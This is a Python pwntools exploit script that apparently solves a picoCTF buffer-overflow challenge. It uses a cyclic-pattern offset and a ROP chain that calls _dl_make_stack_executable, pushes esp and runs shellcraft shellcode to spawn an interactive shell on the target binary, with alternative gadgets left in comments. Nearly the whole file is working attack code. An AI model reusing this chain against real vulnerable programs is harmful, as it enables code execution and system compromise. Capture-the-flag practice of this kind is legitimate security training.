from pwn import *

# from pprint import pprint

context.update(arch='i386', os='linux', endian='little') #acquired context from file command

elf = ELF("./vuln")
# p = remote("saturn.picoctf.net", 57824) #ports may vary between different instance launched
p = elf.process()

# pprint(elf.symbols)

#dmesg after running this shows us the IP being overwritten to 0x61656161
# p.sendline(cyclic(50)) 

payload = [
    cyclic(cyclic_find(0x61656161)), #make a payload from the buffer offset 

    # pack(0x0804afba), #pop esi ; ret
    # pack(0x080b089a), #pop eax ; ret

    pack(elf.symbols['__stack_prot']),

    # pack(0x0805eea9), #pop edx ; pop ebx ; ret

    # pack(0x080b089a), #pop eax ; ret

    # pack(0x08049022), #pop ebx ; ret

    pack(0x7), #PROT_EXEC|PROT_READ|PROT_WRITE|PROT_NONE

    # pack(0x0805fbe2), #mov dword ptr [edx], eax ; ret
    # pack(0x080a3a18), #mov dword ptr [eax], edx ; ret
    # pack(0x080afcf4), #add dword ptr [ecx], eax ; ret

    # pack(0x080b07d9), #mov dword ptr [eax], ebx ; ret
    pack(0x080ab166), #mov dword ptr [esi], eax; xor eax, eax; pop ebx; pop esi; pop edi; ret;

    # pack(0x0804b3cf), #pop edi ; ret

    pack(elf.symbols['__libc_stack_end']),

    pack(elf.symbols['_dl_make_stack_executable']),

    pack(0x080b08aa), #push esp; ret
    # pack(elf.symbols['win'])

    # pack(0x90909090),

    asm(shellcraft.sh())

]

print(payload)

payload = b"".join(payload)
p.sendline(payload)

p.interactive()
p.close()